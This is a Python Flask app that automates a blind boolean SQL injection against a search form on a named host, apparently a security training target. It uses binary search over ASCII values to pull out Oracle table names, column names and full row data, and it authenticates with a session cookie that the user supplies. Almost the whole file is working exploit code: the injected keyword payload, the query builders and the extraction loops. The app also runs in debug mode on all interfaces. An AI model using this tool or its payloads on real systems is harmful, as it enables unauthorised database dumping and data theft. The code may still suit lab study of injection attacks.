from flask import Flask, request, render_template, flash, redirect, url_for, session
from flask_restful import Resource, Api
import requests
from tools.binarySearch import *
import asyncio

# pip install Flask-Session

app=Flask(__name__)
api = Api(app)
app.secret_key = "flashkey"

u = "https://elms1.skinfosec.co.kr:8082/community6/free"
h = {
    "Content-Type": "application/x-www-form-urlencoded"
}
c = {
    "JSESSIONID":""
}
d = {
    "startDt":"",
    "endDt":"",
    "searchType":"all",
    "keyword":"EQST%' and (공격쿼리) and '1%'='1"
}

# ===============================================
#
#            ROUTER DEFINATION PART
#
# ===============================================

@app.route("/")
def index(): 
    session.pop('jsessionid', None)
    return render_template("index.html")


@app.route("/submit", methods=['POST'])
def submit():
    jsessionid = request.form.get('user_input') 
    print(f"{jsessionid}")
    
    set_sessionid(jsessionid)
    session["jsessionid"] = jsessionid

    return redirect('/home')


@app.route("/home", methods=['GET'])
def home():
    if not "jsessionid" in session:
        print("no session")
        flash("세션 id를 입력해야 합니다.")
  
    return redirect("/select")

@app.route("/select", methods=['GET'])
def select_data():
    if not "jsessionid" in session:
        print("no session")
        flash("세션 id를 입력해야 합니다.")

    return render_template("select.html")


@app.route("/table", methods=['GET'])
def get_table():
    check_set_session()

    # 테스트 데이터
    table_count=6
    table_name_list=['ANSWER', 'BOARD', 'COMM_FILE', 'COMM_MDI_FILE', 'MEMBER', 'ZIPCODE']

    # table_count = get_table_count()
    # table_name_list = get_table_name(table_count)
    
    return render_template("table_page.html", table_count=table_count, table_name_list=table_name_list)


@app.route("/column", methods=['GET'])
async def get_column():
    check_set_session()

    table_name = request.args.get('table_name','none') 
    if table_name=='none':
        return render_template("default_column.html")

    # 테스트 데이터
    # column_count = 1
    # column_name_list=['ANSWER']

    column_count = get_column_count(table_name)
    column_name_list = get_coloumn_name(column_count, table_name)
    
    return render_template("column_page.html",table_name=table_name, column_count=column_count, column_name_list=column_name_list)

@app.route("/data", methods=['GET'])
async def get_data():
    check_set_session()
    table_name = request.args.get('table_name','none')
    column_name = request.args.get('column_name','none')

    if table_name=='none' or column_name=='none':
        return render_template("default_data.html")

    data_count = get_data_count(table_name, column_name)
    data_list = get_data_info(table_name, column_name, data_count)

    # data_count=1
    # data_list=['ant6']
    
    return render_template("data_page.html", table_name=table_name, column_name=column_name, data_count=data_count, data_list=data_list)


# ===============================================
#
#           FUNCTION DEFINATION PART
#
# ===============================================

def set_sessionid(jsessionid):
    c = {
        "JSESSIONID":jsessionid
    }

def check_set_session():
    if not "jsessionid" in session:
        print("no session")
        flash("세션 id를 입력해야 합니다.")
    

def binarySearch(query):
    start = 1
    end  = 127
    while start < end:
        mid = int((start + end) / 2)     
        keyword = f"EQST%' and ({query}) > {mid} and '1%'='1"
        print(keyword)
        d["keyword"] = keyword  
        print(".")    
        r = requests.post(url=u, headers=h, cookies={"JSESSIONID":session['jsessionid']}, data=d)

        if '웹 취약점 진단중' in r.text:
            start = mid + 1                 
        else:             
            end = mid      
    return end


# ================================
#        모든 테이블에 대한
#         컬럼 정보 구하기
# ================================


# 테이블 개수를 구하는 함수
def get_table_count():
    # query = f"select count(table_name) from user_tables"
    query = f"select count(tname) from tab"
    table_count = binarySearch(query)
    print(f"table count is : {table_count}")
    return table_count

# 테이블 이름을 구하는 함수
def get_table_name(table_count) :
    # table_name_list={}
    table_name_list=[]

    print(f"in get_table_name def . . .")
    for nth_table in range(1,table_count+1):
        # get_table_name_length_query = f"select length(table_name) from (select table_name, rownum r from user_tables) where r={nth_table}"
        get_table_name_length_query = f"select length(tname) from (select tname, rownum r from tab) where r={nth_table}"
        nth_table_length = binarySearch(get_table_name_length_query)

        table_name=""
        for substr in range(1, nth_table_length+1):
        # 테스트용!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!1
        # for substr in range(1, 3):
            get_table_substr_query=f"select ascii(substr(tname,{substr},1)) from (select tname, rownum r from tab) where r={nth_table}"
            table_substr = binarySearch(get_table_substr_query)

            table_name += chr(table_substr)

        # table_name_list 리스트에 이름을 저장한다.
        table_name_list.append(table_name)

        # table_name_list[table_name]=None

        # !!!!테스트용!!!!
        print(table_name_list)
    return table_name_list


def get_column_count(table_name):
    query = f"select count(cname) from col where tname='{table_name}'"
    col_count = binarySearch(query)
    print (f"컬럼 개수는 {col_count}")
    return col_count


def get_coloumn_name(column_count, table_name) :
    # col_name_list={}
    col_name_list=[]

    for nth_col in range (1, column_count+1):
    # nth_col번째 컬럼의 이름 길이 구하기
        col_length_query = f"select length(cname) from (select cname, rownum r from col where tname='{table_name}') where r={nth_col}"
        col_length = binarySearch(col_length_query)

        col_name=""
        for substr in range(1, col_length+1):
            col_name_query = f"select ascii(substr(cname,{substr},1)) from (select cname, rownum r from col where tname='{table_name}') where r={nth_col}"
            col_name += chr(binarySearch(col_name_query))
            print(col_name)
        
        col_name_list.append(col_name)
        # col_name_list[col_name]=None
        print(col_name_list)

    return col_name_list

# ================================
#        모든 컬럼에 대한
#         데이터 구하기
# ================================

def get_data_count (table_name, column_name):
    query = f"select count({column_name}) from {table_name}"
    data_count = binarySearch(query)

    print(f"데이터의 개수는 {data_count}")
    return data_count

def get_data_info (table_name, column_name, data_count):
    data_list=[]
    for nth_data in range (1, data_count+1):
    # nth_col번째 컬럼의 이름 길이 구하기
        data_length_query=f"select length({column_name}) from (select {column_name}, rownum r from {table_name}) where r={nth_data}"
        data_length = binarySearch(data_length_query)
        print(f"데이터의 길이는 {data_length}")

        sql_data=""
        for substr in range(1, data_length+1):
            data_query=f"select ascii(substr({column_name}, {substr}, 1)) from (select {column_name}, rownum r from {table_name}) where r={nth_data}"
            sql_data += chr(binarySearch(data_query))

        data_list.append(sql_data)
        print(data_list)
    
    return data_list


if __name__ == '__main__':
    app.run('0.0.0.0', port=5001, debug=True)